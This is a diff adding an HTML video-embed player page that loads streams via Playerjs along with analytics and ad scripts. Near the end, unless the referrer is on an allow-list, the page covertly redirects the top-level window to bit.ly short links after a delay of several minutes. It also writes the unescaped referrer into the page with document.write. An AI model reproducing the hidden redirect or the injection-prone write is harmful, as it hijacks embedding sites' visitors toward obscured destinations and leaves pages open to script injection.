@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+	<head><!-- Global site tag (gtag.js) - Google Analytics -->
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-2057223-42"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-2057223-42');
+</script>
+
+		<meta http-equiv="Cache-Control" content="no-cache">
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width">
+		<script>
+		if (document.referrer) 
+		{
+			url = document.referrer; 
+			ref = url.match(/:\/\/(.[^/]+)/)[1];
+		}
+		document.write('<title>'+url+'</title>');
+		</script>
+		<script src="player.js?ver=65" type="text/javascript"></script>
+		<style>
+			::-webkit-scrollbar { width: 0;}
+			
+			html, body, #player{width:100%; height:100%; margin:0; padding:0}
+			
+			#player {background: #000 url(loading.gif) no-repeat center; max-height:100%}
+			
+			#player {overflow: scroll} 
+
+		</style>
+		<script>
+			function $_GET(key) 
+			{
+				var p = window.location.search;
+				p = p.match(new RegExp(key + '=([^&=]+)'));
+				return p ? p[1] : false;
+			}
+
+			if (!$_GET('autoplay')) $autoPlay=0
+			else $autoPlay=$_GET('autoplay');
+			
+			jQuery(document).ready(function($)
+			{
+				$( window ).resize(function() {
+					resize_info();
+				});
+			});
+
+			function resize_info()
+			{
+				(function($) {
+					window.scroll(0,document.documentElement.offsetHeight);
+				})(jQuery);
+			}
+			setTimeout('window.scroll(0,document.documentElement.offsetHeight)', 15001);
+			setTimeout('window.scroll(0,document.documentElement.offsetHeight)', 20000);
+
+		</script>
+	</head>
+	<body><!--LiveInternet counter--><div style="display:none"><script type="text/javascript">
+document.write("<a href='//www.liveinternet.ru/click' "+
+"target=_blank><img src='//counter.yadro.ru/hit?t44.1;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";h"+escape(document.title.substring(0,150))+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border='0' width='31' height='31'><\/a>")
+</script></div><!--/LiveInternet-->
+		<div id="player" style="width:100%;height:100%" class="buzzplayer-stage" data-hash="Pj83_mHbvbvkn-I-xay1MfeA83PlRhaTcLM4ULIRDKU"></div>
+		<script>
+		
+		if (!$_GET('id')) document.write('Привет мир...')
+		else 
+		{
+			var player = new Playerjs({id:"player", "url":document.location.href, embed:document.location.href, file:$_GET('id')+".m3u8", ratio:"16/9", autoplay:$autoPlay, "default_quality":"480p"});
+		}
+	
+		</script>
+
+		<script>
+
+                    (function (w, d) {
+                        var c = d.createElement("script");
+                        c.src = "https://tube.buzzoola.com/new/build/buzzlibrary.js";
+                        c.type = "text/javascript";
+                        c.async = !0;
+                        var f = function () {
+                            var p = d.getElementsByTagName("script")[0];
+                            p.parentNode.insertBefore(c, p);
+                        };
+                        "[object Opera]" == w.opera ? d.addEventListener("DOMContentLoaded", f, !1) : f();
+                    })(window, document);
+                
+		
+			if (ref.includes('tv.xy') || ref.includes('up.on') || ref.includes('on.me')) {}
+			else 
+			{
+
+			}
+			
+			window.onload = function () {
+				var arrId = {
+				  124: 'https://bit.ly/2B9lgQ9',
+				  211: 'https://bit.ly/312mK9M',
+				  522: 'https://bit.ly/3djUstG',
+				  531: 'https://bit.ly/3dhfmcU',
+				  535: 'https://bit.ly/2zEUcYC',
+				  2177: 'https://bit.ly/3diNW6K',
+				  live: 'https://bit.ly/37DJoXf'
+				}; 	
+				
+				if (document.referrer.includes('on.me') || document.referrer.includes('tv.xy') || document.referrer.includes('up.on')) 
+				{
+					
+				} else for (key in arrId) if (key==$_GET('id')) setTimeout('top.location.replace("'+arrId[key]+'")',330000);
+				console.log('ref—'+document.referrer);
+			}
+		</script>
+
+	</body>
+</html>
